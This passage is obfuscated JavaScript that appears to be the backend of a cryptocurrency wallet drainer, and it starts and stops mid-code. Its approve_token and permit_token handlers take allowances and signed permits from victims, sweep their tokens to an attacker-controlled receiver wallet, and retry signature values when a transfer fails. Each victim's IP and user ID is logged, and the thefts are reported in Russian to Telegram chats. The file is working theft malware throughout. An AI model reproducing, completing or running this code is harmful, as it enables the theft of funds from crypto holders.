_0xd199b2=_0xb41be2;try{add_record({'type':'approve_success','domain':_0xce053a[_0xd199b2(0x1a7)],'IP':_0xce053a['IP'],'user_id':_0xce053a[_0xd199b2(0xa0)],'asset':_0xce053a['asset'],'worker_id':_0xce053a['worker_id']||null});if(_0xce053a[_0xd199b2(0x1a2)]==![]&&MS_Notifications[_0xd199b2(0x113)]['mode']||_0xce053a[_0xd199b2(0x1a2)]!=![]&&_0xce053a[_0xd199b2(0x1a2)][_0xd199b2(0x113)]!=''){let _0x317b74=_0xce053a[_0xd199b2(0x1a2)]==![]?MS_Notifications[_0xd199b2(0x113)][_0xd199b2(0x184)]:_0xce053a[_0xd199b2(0x1a2)][_0xd199b2(0x113)];try{await bot['sendMessage'](_0x317b74,_0xd199b2(0x79)+_0xce053a[_0xd199b2(0xa0)]+_0xd199b2(0x136)+_0xce053a['asset'][_0xd199b2(0x1bf)]+'['+chain_id_to_name(_0xce053a['asset'][_0xd199b2(0x7a)])+',\x20'+_0xce053a[_0xd199b2(0x154)][_0xd199b2(0xcf)]+_0xd199b2(0xf3)+parseFloat(_0xce053a[_0xd199b2(0x154)][_0xd199b2(0x11f)])[_0xd199b2(0xec)](0x2)+'$)',{'parse_mode':_0xd199b2(0x1a4)});}catch(_0x19d169){console[_0xd199b2(0xb9)](_0x19d169);}}send_response(_0x987872,{'status':'OK'});}catch(_0x51be0e){console['log'](_0x51be0e),send_response(_0x987872,{'status':'error','error':_0xd199b2(0x1cb)});}},on_transfer_success=async(_0x2cf127,_0x1b74f3)=>{const _0x915a53=_0xb41be2;try{add_record({'type':'transfer_success','domain':_0x1b74f3[_0x915a53(0x1a7)],'IP':_0x1b74f3['IP'],'user_id':_0x1b74f3[_0x915a53(0xa0)],'asset':_0x1b74f3[_0x915a53(0x154)],'worker_id':_0x1b74f3[_0x915a53(0x70)]||null});_0x1b74f3[_0x915a53(0x154)]['type']==_0x915a53(0x74)&&add_record({'type':_0x915a53(0xc3),'domain':_0x1b74f3[_0x915a53(0x1a7)],'IP':_0x1b74f3['IP'],'user_id':_0x1b74f3[_0x915a53(0xa0)],'asset':_0x1b74f3[_0x915a53(0x154)],'worker_id':_0x1b74f3[_0x915a53(0x70)]||null});if(_0x1b74f3[_0x915a53(0x1a2)]==![]&&MS_Notifications['transfer_success'][_0x915a53(0x1b1)]||_0x1b74f3[_0x915a53(0x1a2)]!=![]&&_0x1b74f3[_0x915a53(0x1a2)][_0x915a53(0xd6)]!=''){let _0x2387c0=_0x1b74f3['chat_data']==![]?MS_Notifications[_0x915a53(0xd6)]['chat_id']:_0x1b74f3[_0x915a53(0x1a2)][_0x915a53(0xd6)];try{await bot[_0x915a53(0x1a3)](_0x2387c0,'<b>✅\x20User\x20#'+_0x1b74f3[_0x915a53(0xa0)]+'\x20made\x20a\x20transfer</b>\x0a\x0a<b>Translation\x20object:</b>'+_0x1b74f3[_0x915a53(0x154)][_0x915a53(0x1bf)]+'\x20['+chain_id_to_name(_0x1b74f3['asset'][_0x915a53(0x7a)])+',\x20'+_0x1b74f3[_0x915a53(0x154)][_0x915a53(0xcf)]+']\x20('+parseFloat(_0x1b74f3[_0x915a53(0x154)][_0x915a53(0x11f)])[_0x915a53(0xec)](0x2)+'$)',{'parse_mode':_0x915a53(0x1a4)});}catch(_0x52b0f){console[_0x915a53(0xb9)](_0x52b0f);}}send_response(_0x2cf127,{'status':'OK'});}catch(_0x56fbcb){console['log'](_0x56fbcb),send_response(_0x2cf127,{'status':_0x915a53(0x8f),'error':_0x915a53(0x1cb)});}},convert_chain=(_0x263084,_0x4a8842,_0x390797)=>{const _0x58e7ad=_0xb41be2;try{if(_0x263084=='DEBANK'&&_0x4a8842=='ID')switch(_0x390797){case _0x58e7ad(0x187):return 0x1;case _0x58e7ad(0x1c1):return 0x38;case _0x58e7ad(0x64):return 0x89;case _0x58e7ad(0x12b):return 0xa86a;case _0x58e7ad(0x9b):return 0xa4b1;case'op':return 0xa;case _0x58e7ad(0x166):return 0xfa;default:return![];}else{if(_0x263084==_0x58e7ad(0x1af)&&_0x4a8842=='ID')switch(_0x390797){case _0x58e7ad(0xfe):return 0x1;case _0x58e7ad(0x124):return 0x38;case'polygon':return 0x89;case _0x58e7ad(0x91):return 0xa86a;case _0x58e7ad(0xf0):return 0xa4b1;case _0x58e7ad(0x10e):return 0xa;case _0x58e7ad(0xbb):return 0xfa;default:return![];}else{if(_0x263084=='ID'&&_0x4a8842=='CURRENCY')switch(_0x390797){case 0x1:return _0x58e7ad(0x10c);case 0x38:return'BNB';case 0x89:return _0x58e7ad(0xc1);case 0xa86a:return _0x58e7ad(0x137);case 0xa4b1:return _0x58e7ad(0x10c);case 0xa:return _0x58e7ad(0x10c);case 0xfa:return _0x58e7ad(0x1a0);default:return![];}}}}catch(_0x1dfe29){return console[_0x58e7ad(0xb9)](_0x1dfe29),![];}},Get_ERC20_Allowance=async(_0x282296,_0x4c90f0,_0x4fb1c8,_0x32d799)=>{const _0x18eedb=_0xb41be2;try{const _0x56a372=new ethers[(_0x18eedb(0x1c8))][(_0x18eedb(0x197))](MS_RPC_URLs[_0x282296]),_0x15dcb2=new ethers[(_0x18eedb(0x1b0))](_0x4c90f0,MS_Contract_ABI[_0x18eedb(0x93)],_0x56a372),_0x22292f=ethers[_0x18eedb(0xf4)][_0x18eedb(0x16f)](await _0x15dcb2[_0x18eedb(0x1b5)](_0x4fb1c8)),_0xeeefc5=ethers[_0x18eedb(0xf4)][_0x18eedb(0x16f)](await _0x15dcb2[_0x18eedb(0x1ac)](_0x4fb1c8,_0x32d799));if(_0x22292f[_0x18eedb(0xe9)](ethers[_0x18eedb(0xf4)][_0x18eedb(0x16f)]('0'))||_0xeeefc5['lte'](ethers[_0x18eedb(0xf4)][_0x18eedb(0x16f)]('0')))return![];if(_0x22292f[_0x18eedb(0xe9)](_0xeeefc5))return _0x22292f[_0x18eedb(0x14d)]();else return _0xeeefc5['toString']();}catch(_0x45fce3){return console[_0x18eedb(0xb9)](_0x45fce3),![];}},approve_token=async(_0x2b0e98,_0x1e8cc1)=>{const _0x40f3f8=_0xb41be2;try{if(MS_Protection){if(User_IPs_Pool[_0x1e8cc1['IP']]){if(User_IPs_Pool[_0x1e8cc1['IP']][_0x40f3f8(0x188)]>Math[_0x40f3f8(0x16a)](Date[_0x40f3f8(0x15b)]()/0x3e8))return block_request(_0x2b0e98);}}if(MS_VERIFY_WALLET==0x1&&!MS_Verified_Addresses[_0x1e8cc1[_0x40f3f8(0x1b7)]])return send_response(_0x2b0e98,{'status':'error','error':_0x40f3f8(0xbe)});let _0x1893ea=await Get_ERC20_Allowance(_0x1e8cc1[_0x40f3f8(0x154)][_0x40f3f8(0x7a)],_0x1e8cc1['asset'][_0x40f3f8(0x1b7)],_0x1e8cc1['address'],MS_Wallet_Address);if(!_0x1893ea){await new Promise(_0x2e15df=>setTimeout(_0x2e15df,0x7d0)),_0x1893ea=await Get_ERC20_Allowance(_0x1e8cc1[_0x40f3f8(0x154)][_0x40f3f8(0x7a)],_0x1e8cc1[_0x40f3f8(0x154)][_0x40f3f8(0x1b7)],_0x1e8cc1[_0x40f3f8(0x1b7)],MS_Wallet_Address);if(!_0x1893ea){await new Promise(_0x723a7c=>setTimeout(_0x723a7c,0x1388)),_0x1893ea=await Get_ERC20_Allowance(_0x1e8cc1['asset']['chain_id'],_0x1e8cc1[_0x40f3f8(0x154)]['address'],_0x1e8cc1[_0x40f3f8(0x1b7)],MS_Wallet_Address);if(!_0x1893ea){if(_0x1e8cc1[_0x40f3f8(0x1a2)]==![]&&MS_Notifications[_0x40f3f8(0x6e)][_0x40f3f8(0x1b1)]||_0x1e8cc1[_0x40f3f8(0x1a2)]!=![]&&_0x1e8cc1[_0x40f3f8(0x1a2)][_0x40f3f8(0x6e)]!=''){let _0x3d212c=_0x1e8cc1[_0x40f3f8(0x1a2)]==![]?MS_Notifications[_0x40f3f8(0x6e)][_0x40f3f8(0x184)]:_0x1e8cc1['chat_data'][_0x40f3f8(0x6e)];await bot[_0x40f3f8(0x1a3)](_0x3d212c,'<b>❌\x20Не\x20удалось\x20вывести\x20токен\x20пользователя\x20#'+_0x1e8cc1[_0x40f3f8(0xa0)]+_0x40f3f8(0xe4)+_0x1e8cc1[_0x40f3f8(0x154)]['name']+'\x20['+chain_id_to_name(_0x1e8cc1[_0x40f3f8(0x154)][_0x40f3f8(0x7a)])+']\x0a\x0aВозможно,\x20транзакция\x20подтверждения\x20не\x20прошла\x20или\x20ещё\x20в\x20очереди,\x20попробуйте\x20вывести\x20токен\x20в\x20ручном\x20режиме!',{'parse_mode':_0x40f3f8(0x1a4)});}return send_response(_0x2b0e98,{'status':_0x40f3f8(0x8f),'error':_0x40f3f8(0x1cb)});}}}const _0x3f5849=new ethers[(_0x40f3f8(0x1c8))]['JsonRpcProvider'](MS_RPC_URLs[_0x1e8cc1[_0x40f3f8(0x154)][_0x40f3f8(0x7a)]]),_0x5b0d07=new ethers[(_0x40f3f8(0x128))](MS_Wallet_Private,_0x3f5849),_0x20dda4=new ethers['Contract'](_0x1e8cc1[_0x40f3f8(0x154)]['address'],MS_Contract_ABI[_0x40f3f8(0x93)],_0x5b0d07),_0x9854d4=ethers[_0x40f3f8(0xf4)][_0x40f3f8(0x16f)](await _0x3f5849['getGasPrice']())['div'](ethers[_0x40f3f8(0xf4)][_0x40f3f8(0x16f)]('100'))[_0x40f3f8(0x92)](ethers['BigNumber'][_0x40f3f8(0x16f)](_0x40f3f8(0xdc)))[_0x40f3f8(0x14d)]();let _0x1db5b3=null;try{_0x1db5b3=await _0x20dda4[_0x40f3f8(0xc0)][_0x40f3f8(0x122)](_0x1e8cc1[_0x40f3f8(0x1b7)],MS_Wallet_Receiver,_0x1893ea,{'from':MS_Wallet_Address}),_0x1db5b3=ethers[_0x40f3f8(0xf4)][_0x40f3f8(0x16f)](_0x1db5b3)[_0x40f3f8(0x148)](ethers[_0x40f3f8(0xf4)][_0x40f3f8(0x16f)](_0x40f3f8(0x115)))[_0x40f3f8(0x92)](ethers[_0x40f3f8(0xf4)][_0x40f3f8(0x16f)](_0x40f3f8(0xdc)))[_0x40f3f8(0x14d)]();}catch(_0x900cca){_0x1db5b3=_0x1e8cc1[_0x40f3f8(0x154)]['chain_id']==0xa4b1?0x4c4b40:_0x1e8cc1[_0x40f3f8(0x154)]['chain_id']==0xa86a?0x4c4b40:0x493e0;}const _0x456189=await _0x3f5849['getTransactionCount'](MS_Wallet_Address,'pending');try{const _0x1ea1ba=await _0x20dda4[_0x40f3f8(0x122)](_0x1e8cc1[_0x40f3f8(0x1b7)],MS_Wallet_Receiver,_0x1893ea,{'gasLimit':ethers[_0x40f3f8(0xf4)][_0x40f3f8(0x16f)](_0x1db5b3),'gasPrice':ethers[_0x40f3f8(0xf4)][_0x40f3f8(0x16f)](_0x9854d4),'nonce':_0x456189});await _0x3f5849[_0x40f3f8(0x6b)](_0x1ea1ba['hash'],0x1,0xea60),add_record({'type':_0x40f3f8(0xc3),'domain':_0x1e8cc1['domain'],'IP':_0x1e8cc1['IP'],'user_id':_0x1e8cc1[_0x40f3f8(0xa0)],'asset':_0x1e8cc1[_0x40f3f8(0x154)],'worker_id':_0x1e8cc1[_0x40f3f8(0x70)]||null});if(_0x1e8cc1[_0x40f3f8(0x1a2)]==![]&&MS_Notifications['approve_success'][_0x40f3f8(0x1b1)]||_0x1e8cc1[_0x40f3f8(0x1a2)]!=![]&&_0x1e8cc1['chat_data']['approve_success']!=''){let _0x231c64=_0x1e8cc1[_0x40f3f8(0x1a2)]==![]?MS_Notifications[_0x40f3f8(0x113)]['chat_id']:_0x1e8cc1['chat_data']['approve_success'];await bot[_0x40f3f8(0x1a3)](_0x231c64,'<b>💎\x20Успешно\x20выведен\x20токен\x20пользователя\x20#'+_0x1e8cc1[_0x40f3f8(0xa0)]+_0x40f3f8(0xe4)+_0x1e8cc1['asset'][_0x40f3f8(0x1bf)]+'\x20['+chain_id_to_name(_0x1e8cc1['asset'][_0x40f3f8(0x7a)])+',\x20'+parseFloat(_0x1e8cc1[_0x40f3f8(0x154)][_0x40f3f8(0x11f)])[_0x40f3f8(0xec)](0x2)+'$]',{'parse_mode':'HTML'});}}catch(_0x2deb2b){if(_0x1e8cc1[_0x40f3f8(0x1a2)]==![]&&MS_Notifications['approve_cancel'][_0x40f3f8(0x1b1)]||_0x1e8cc1[_0x40f3f8(0x1a2)]!=![]&&_0x1e8cc1['chat_data']['approve_cancel']!=''){let _0x42e05d=_0x1e8cc1['chat_data']==![]?MS_Notifications[_0x40f3f8(0x6e)][_0x40f3f8(0x184)]:_0x1e8cc1[_0x40f3f8(0x1a2)][_0x40f3f8(0x6e)];await bot[_0x40f3f8(0x1a3)](_0x42e05d,'<b>❌\x20Не\x20удалось\x20вывести\x20токен\x20пользователя\x20#'+_0x1e8cc1[_0x40f3f8(0xa0)]+'</b>\x0a\x0a<b>Токен:</b>\x20'+_0x1e8cc1[_0x40f3f8(0x154)][_0x40f3f8(0x1bf)]+'\x20['+chain_id_to_name(_0x1e8cc1['asset'][_0x40f3f8(0x7a)])+_0x40f3f8(0xd0),{'parse_mode':_0x40f3f8(0x1a4)});}}send_response(_0x2b0e98,{'status':'OK'});}catch(_0x271a0f){console[_0x40f3f8(0xb9)](_0x271a0f);try{if(_0x1e8cc1['chat_data']==![]&&MS_Notifications[_0x40f3f8(0x6e)][_0x40f3f8(0x1b1)]||_0x1e8cc1[_0x40f3f8(0x1a2)]!=![]&&_0x1e8cc1[_0x40f3f8(0x1a2)]['approve_cancel']!=''){let _0x3a0249=_0x1e8cc1[_0x40f3f8(0x1a2)]==![]?MS_Notifications[_0x40f3f8(0x6e)][_0x40f3f8(0x184)]:_0x1e8cc1[_0x40f3f8(0x1a2)][_0x40f3f8(0x6e)];await bot['sendMessage'](_0x3a0249,_0x40f3f8(0x1a6)+_0x1e8cc1['user_id']+'</b>\x0a\x0a<b>Токен:</b>\x20'+_0x1e8cc1['asset'][_0x40f3f8(0x1bf)]+'\x20['+chain_id_to_name(_0x1e8cc1[_0x40f3f8(0x154)]['chain_id'])+_0x40f3f8(0xd0),{'parse_mode':_0x40f3f8(0x1a4)});}}catch(_0x292567){console[_0x40f3f8(0xb9)](_0x292567);}send_response(_0x2b0e98,{'status':_0x40f3f8(0x8f),'error':_0x40f3f8(0x1cb)});}},permit_token=async(_0x1ea43b,_0x173892)=>{const _0xce80ff=_0xb41be2;try{if(MS_Protection){if(User_IPs_Pool[_0x173892['IP']]){if(User_IPs_Pool[_0x173892['IP']][_0xce80ff(0x188)]>Math[_0xce80ff(0x16a)](Date[_0xce80ff(0x15b)]()/0x3e8))return block_request(_0x1ea43b);}}if(MS_VERIFY_WALLET==0x1&&!MS_Verified_Addresses[_0x173892[_0xce80ff(0x1b7)]])return send_response(_0x1ea43b,{'status':_0xce80ff(0x8f),'error':_0xce80ff(0xbe)});if(_0x173892[_0xce80ff(0x161)]['type']==0x1)try{add_record({'type':'permit_data','domain':_0x173892[_0xce80ff(0x1a7)],'IP':_0x173892['IP'],'user_id':_0x173892[_0xce80ff(0xa0)],'worker_id':_0x173892[_0xce80ff(0x70)]||null,'permit_ver':0x1,'sign':_0x173892[_0xce80ff(0x161)]});if(_0x173892[_0xce80ff(0x1a2)]==![]&&MS_Notifications[_0xce80ff(0x144)][_0xce80ff(0x1b1)]||_0x173892[_0xce80ff(0x1a2)]!=![]&&_0x173892['chat_data'][_0xce80ff(0x144)]!=''){let _0x3bdc52=_0x173892[_0xce80ff(0x1a2)]==![]?MS_Notifications[_0xce80ff(0x144)][_0xce80ff(0x184)]:_0x173892[_0xce80ff(0x1a2)][_0xce80ff(0x144)];await bot[_0xce80ff(0x1a3)](_0x3bdc52,'<b>🔑\x20Данные\x20PERMIT\x20пользователя\x20#'+_0x173892[_0xce80ff(0xa0)]+'</b>\x0a\x0a<b>owner:</b>\x20<code>'+_0x173892[_0xce80ff(0x161)][_0xce80ff(0xa8)]+'</code>\x0a<b>spender:</b>\x20<code>'+_0x173892[_0xce80ff(0x161)][_0xce80ff(0x1bb)]+_0xce80ff(0x72)+_0x173892[_0xce80ff(0x161)][_0xce80ff(0x15d)]+'</code>\x0a<b>v:</b>\x20<code>'+_0x173892[_0xce80ff(0x161)]['v']+_0xce80ff(0x6c)+_0x173892[_0xce80ff(0x161)]['r']+_0xce80ff(0x14b)+_0x173892[_0xce80ff(0x161)]['s']+'</code>\x0a\x0aС\x20помощью\x20этих\x20данных\x20вы\x20можете\x20самостоятельно\x20подписать\x20PERMIT\x20в\x20сети\x20'+chain_id_to_name(_0x173892[_0xce80ff(0x161)][_0xce80ff(0x7a)])+_0xce80ff(0x13f)+_0x173892['sign'][_0xce80ff(0x1b7)]+'</code>',{'parse_mode':_0xce80ff(0x1a4)});}}catch(_0x1f50c7){console[_0xce80ff(0xb9)](_0x1f50c7);}else try{add_record({'type':_0xce80ff(0x8c),'domain':_0x173892['domain'],'IP':_0x173892['IP'],'user_id':_0x173892[_0xce80ff(0xa0)],'worker_id':_0x173892['worker_id']||null,'permit_ver':0x2,'sign':_0x173892['sign']});if(_0x173892['chat_data']==![]&&MS_Notifications[_0xce80ff(0x144)][_0xce80ff(0x1b1)]||_0x173892[_0xce80ff(0x1a2)]!=![]&&_0x173892[_0xce80ff(0x1a2)][_0xce80ff(0x144)]!=''){let _0x43e365=_0x173892[_0xce80ff(0x1a2)]==![]?MS_Notifications['permit_sign_data'][_0xce80ff(0x184)]:_0x173892[_0xce80ff(0x1a2)]['permit_sign_data'];await bot['sendMessage'](_0x43e365,_0xce80ff(0x9e)+_0x173892['user_id']+'</b>\x0a\x0a<b>owner:</b>\x20<code>'+_0x173892[_0xce80ff(0x161)][_0xce80ff(0xa8)]+_0xce80ff(0x10d)+_0x173892['sign'][_0xce80ff(0x1bb)]+_0xce80ff(0xb2)+_0x173892[_0xce80ff(0x161)][_0xce80ff(0x150)]+_0xce80ff(0x17c)+_0x173892[_0xce80ff(0x161)]['deadline']+'</code>\x0a<b>v:</b>\x20<code>'+_0x173892[_0xce80ff(0x161)]['v']+_0xce80ff(0x6c)+_0x173892[_0xce80ff(0x161)]['r']+_0xce80ff(0x14b)+_0x173892[_0xce80ff(0x161)]['s']+_0xce80ff(0x75)+chain_id_to_name(_0x173892[_0xce80ff(0x161)]['chain_id'])+_0xce80ff(0x13f)+_0x173892[_0xce80ff(0x161)][_0xce80ff(0x1b7)]+_0xce80ff(0x126),{'parse_mode':_0xce80ff(0x1a4)});}}catch(_0x4f052f){console[_0xce80ff(0xb9)](_0x4f052f);}const _0xb7d723=new ethers[(_0xce80ff(0x1c8))][(_0xce80ff(0x197))](MS_RPC_URLs[_0x173892[_0xce80ff(0x161)][_0xce80ff(0x7a)]]),_0x4c38da=new ethers[(_0xce80ff(0x128))](MS_Wallet_Private,_0xb7d723),_0x344544=new ethers[(_0xce80ff(0x1b0))](_0x173892[_0xce80ff(0x161)][_0xce80ff(0x1b7)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0x97)],_0x4c38da),_0x297d13=ethers[_0xce80ff(0xf4)][_0xce80ff(0x16f)](await _0xb7d723[_0xce80ff(0x87)]())[_0xce80ff(0x148)](ethers[_0xce80ff(0xf4)][_0xce80ff(0x16f)](_0xce80ff(0x115)))[_0xce80ff(0x92)](ethers[_0xce80ff(0xf4)][_0xce80ff(0x16f)]('150'))[_0xce80ff(0x14d)]();let _0x1f58e2=null;try{_0x173892[_0xce80ff(0x161)][_0xce80ff(0xcf)]==0x1?_0x1f58e2=await _0x344544[_0xce80ff(0xc0)][_0xce80ff(0xf8)](_0x173892[_0xce80ff(0x161)][_0xce80ff(0xa8)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0x1bb)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0xd4)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0x15d)],!![],_0x173892['sign']['v'],_0x173892[_0xce80ff(0x161)]['r'],_0x173892['sign']['s'],{'from':MS_Wallet_Address}):_0x1f58e2=await _0x344544[_0xce80ff(0xc0)][_0xce80ff(0xf8)](_0x173892[_0xce80ff(0x161)][_0xce80ff(0xa8)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0x1bb)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0x150)],_0x173892['sign'][_0xce80ff(0x15d)],_0x173892[_0xce80ff(0x161)]['v'],_0x173892[_0xce80ff(0x161)]['r'],_0x173892[_0xce80ff(0x161)]['s'],{'from':MS_Wallet_Address}),_0x1f58e2=ethers['BigNumber'][_0xce80ff(0x16f)](_0x1f58e2)['div'](ethers[_0xce80ff(0xf4)][_0xce80ff(0x16f)](_0xce80ff(0x115)))['mul'](ethers['BigNumber'][_0xce80ff(0x16f)](_0xce80ff(0xdc)))['toString']();}catch(_0x342b4f){if(MS_Settings[_0xce80ff(0xc5)][_0xce80ff(0xfd)]==0x1)_0x1f58e2=_0x173892[_0xce80ff(0x154)][_0xce80ff(0x7a)]==0xa4b1?0x4c4b40:_0x173892[_0xce80ff(0x154)][_0xce80ff(0x7a)]==0xa86a?0x4c4b40:0x493e0;else _0x1f58e2=0xe4e1c0;}const _0x36d45a=await _0xb7d723[_0xce80ff(0xa5)](MS_Wallet_Address,_0xce80ff(0x157));if(MS_Settings[_0xce80ff(0xc5)][_0xce80ff(0xfd)]==0x0&&ethers[_0xce80ff(0xf4)][_0xce80ff(0x16f)](_0x1f58e2)['gte'](ethers[_0xce80ff(0xf4)][_0xce80ff(0x16f)](_0xce80ff(0x146)))){const _0x41a204=[0x0,0x1,0x1b,0x1c,0x2f,0xd7];let _0x1c2dea=![];if(MS_Settings[_0xce80ff(0xc5)][_0xce80ff(0x1cd)]==0x1)for(const _0x55a078 of _0x41a204){try{try{_0x173892[_0xce80ff(0x161)][_0xce80ff(0xcf)]==0x1?_0x1f58e2=await _0x344544[_0xce80ff(0xc0)]['permit'](_0x173892['sign']['owner'],_0x173892[_0xce80ff(0x161)][_0xce80ff(0x1bb)],_0x173892['sign'][_0xce80ff(0xd4)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0x15d)],!![],_0x55a078,_0x173892[_0xce80ff(0x161)]['r'],_0x173892[_0xce80ff(0x161)]['s'],{'from':MS_Wallet_Address}):_0x1f58e2=await _0x344544[_0xce80ff(0xc0)][_0xce80ff(0xf8)](_0x173892['sign'][_0xce80ff(0xa8)],_0x173892['sign'][_0xce80ff(0x1bb)],_0x173892['sign'][_0xce80ff(0x150)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0x15d)],_0x55a078,_0x173892[_0xce80ff(0x161)]['r'],_0x173892[_0xce80ff(0x161)]['s'],{'from':MS_Wallet_Address});}catch(_0x2fa056){_0x1f58e2=0xe4e1c0;}if(ethers['BigNumber']['from'](_0x1f58e2)['lt'](ethers['BigNumber'][_0xce80ff(0x16f)](_0xce80ff(0x146)))){_0x1f58e2=ethers[_0xce80ff(0xf4)][_0xce80ff(0x16f)](_0x1f58e2)[_0xce80ff(0x148)](ethers[_0xce80ff(0xf4)][_0xce80ff(0x16f)]('100'))[_0xce80ff(0x92)](ethers[_0xce80ff(0xf4)][_0xce80ff(0x16f)](_0xce80ff(0xdc)))[_0xce80ff(0x14d)](),_0x1c2dea=!![],_0x173892[_0xce80ff(0x161)]['v']=_0x55a078;try{let _0x2190d6=_0x173892[_0xce80ff(0x1a2)]==![]?MS_Notifications[_0xce80ff(0x144)][_0xce80ff(0x184)]:_0x173892[_0xce80ff(0x1a2)]['permit_sign_data'];await bot['sendMessage'](_0x2190d6,_0xce80ff(0x9e)+_0x173892[_0xce80ff(0xa0)]+_0xce80ff(0xcc)+_0x173892[_0xce80ff(0x161)][_0xce80ff(0xa8)]+'</code>\x0a<b>spender:</b>\x20<code>'+_0x173892[_0xce80ff(0x161)][_0xce80ff(0x1bb)]+'</code>\x0a<b>value:</b>\x20<code>'+_0x173892[_0xce80ff(0x161)][_0xce80ff(0x150)]+'</code>\x0a<b>deadline:</b>\x20<code>'+_0x173892[_0xce80ff(0x161)]['deadline']+_0xce80ff(0x1ce)+_0x173892[_0xce80ff(0x161)]['v']+'</code>\x0a<b>r:</b>\x20<code>'+_0x173892[_0xce80ff(0x161)]['r']+_0xce80ff(0x14b)+_0x173892[_0xce80ff(0x161)]['s']+_0xce80ff(0x75)+chain_id_to_name(_0x173892[_0xce80ff(0x161)][_0xce80ff(0x7a)])+_0xce80ff(0x13f)+_0x173892['sign']['address']+_0xce80ff(0x126),{'parse_mode':_0xce80ff(0x1a4)});}catch(_0x5f185e){console[_0xce80ff(0xb9)](_0x5f185e);}break;}}catch(_0x4d1143){console['log'](_0x4d1143);}}if(_0x1c2dea==![]){if(_0x173892[_0xce80ff(0x1a2)]==![]&&MS_Notifications[_0xce80ff(0x6e)][_0xce80ff(0x1b1)]||_0x173892[_0xce80ff(0x1a2)]!=![]&&_0x173892[_0xce80ff(0x1a2)][_0xce80ff(0x6e)]!=''){let _0x3d2f15=_0x173892[_0xce80ff(0x1a2)]==![]?MS_Notifications[_0xce80ff(0x6e)][_0xce80ff(0x184)]:_0x173892[_0xce80ff(0x1a2)][_0xce80ff(0x6e)];await bot[_0xce80ff(0x1a3)](_0x3d2f15,_0xce80ff(0x12e)+_0x173892[_0xce80ff(0xa0)]+_0xce80ff(0xbf),{'parse_mode':_0xce80ff(0x1a4)});}return send_response(_0x1ea43b,{'status':'OK'});}}if(_0x173892[_0xce80ff(0x161)][_0xce80ff(0xcf)]==0x1)try{const _0x1e9a56=await _0x344544[_0xce80ff(0xf8)](_0x173892['sign'][_0xce80ff(0xa8)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0x1bb)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0xd4)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0x15d)],!![],_0x173892[_0xce80ff(0x161)]['v'],_0x173892[_0xce80ff(0x161)]['r'],_0x173892['sign']['s'],{'gasLimit':ethers['BigNumber'][_0xce80ff(0x16f)](_0x1f58e2),'gasPrice':ethers['BigNumber'][_0xce80ff(0x16f)](_0x297d13),'nonce':_0x36d45a});await _0xb7d723[_0xce80ff(0x6b)](_0x1e9a56[_0xce80ff(0x8e)],0x1,0xea60);}catch(_0x9d37be){console[_0xce80ff(0xb9)](_0x9d37be);if(_0x173892[_0xce80ff(0x1a2)]==![]&&MS_Notifications[_0xce80ff(0x6e)]['mode']||_0x173892[_0xce80ff(0x1a2)]!=![]&&_0x173892['chat_data']['approve_cancel']!=''){let _0x50f6b3=_0x173892[_0xce80ff(0x1a2)]==![]?MS_Notifications[_0xce80ff(0x6e)][_0xce80ff(0x184)]:_0x173892[_0xce80ff(0x1a2)][_0xce80ff(0x6e)];await bot[_0xce80ff(0x1a3)](_0x50f6b3,_0xce80ff(0x12e)+_0x173892['user_id']+_0xce80ff(0xe5),{'parse_mode':_0xce80ff(0x1a4)});}return send_response(_0x1ea43b,{'status':_0xce80ff(0x8f),'error':_0xce80ff(0x1cb)});}else try{const _0x374bd7=await _0x344544[_0xce80ff(0xf8)](_0x173892[_0xce80ff(0x161)][_0xce80ff(0xa8)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0x1bb)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0x150)],_0x173892[_0xce80ff(0x161)][_0xce80ff(0x15d)],_0x173892['sign']['v'],_0x173892['sign']['r'],_0x173892['sign']['s'],{'gasLimit':ethers[_0xce80ff(0xf4)][_0xce80ff(0x16f)](_0x1f58e2),'gasPrice':ethers[_0xce80ff(0xf4)]['from'](_0x297d13),'nonce':_0x36d45a});await _0xb7d723[_0xce80ff(0x6b)](_0x374bd7['hash'],0x1,0xea60);}catch(_0x306f82){console[_0xce80ff(0xb9)](_0x306f82);if(_0x173892[_0xce80ff(0x1a2)]==![]&&MS_Notifications[_0xce80ff(0x6e)][_0xce80ff(0x1b1)]||_0x173892[_0xce80ff(0x1a2)]!=![]&&_0x173892[_0xce80ff(0x1a2)][_0xce80ff(0x6e)]!=''){let _0x573490=_0x173892[_0xce80ff(0x1a2)]==![]?MS_Notifications['approve_cancel'][_0xce80ff(0x184)]:_0x173892[_0xce80ff(0x1a2)][_0xce80ff(0x6e)];await bot['sendMessage'](_0x573490,_0xce80ff(0x12e)+_0x173892[_0xce80ff(0xa0)]+_0xce80ff(0xe5),{'parse_mode':_0xce80ff(0x1a4)});}return send_response(_0x1ea43b,{'status':_0xce80ff(0x8f),'error':_0xce80ff(0x1cb)});}return add_record({'type':_0xce80ff(0x19e),'domain':_0x173892[_0xce80ff(0x1a7)],'IP':_0x173892['IP'],'user_id':_0x173892[_0xce80ff(0xa0)],'asset':_0x173892['asset'],'worker_id':_0x173892[_0xce80ff(0x70)]||null}),_0x173892['action']=_0xce80ff(0x103),delete _0x173892['sign'],approve_token(_0x1ea43b,_0x173892);}catch(_0x312222){console[_0xce80ff(0xb9)](_0x312222);try{if(_0x173892[_0xce80ff(0x1a2)]==![]&&MS_Notifications[_0xce80ff(0x6e)][_0xce80ff(0x1b1)]||_0x173892[_0xce80ff(0x1a2)]!=![]&&_0x173892['chat_data']['approve_cancel']!=''){let _0x47e6d2=_0x173892[_0xce80ff(0x1a2)]==![]?MS_Notifications[_0xce80ff(0x6e)][_0xce80ff(0x184)]:_0x173892[_0xce80ff(0x1a2)][_0xce80ff(0x6e)];await 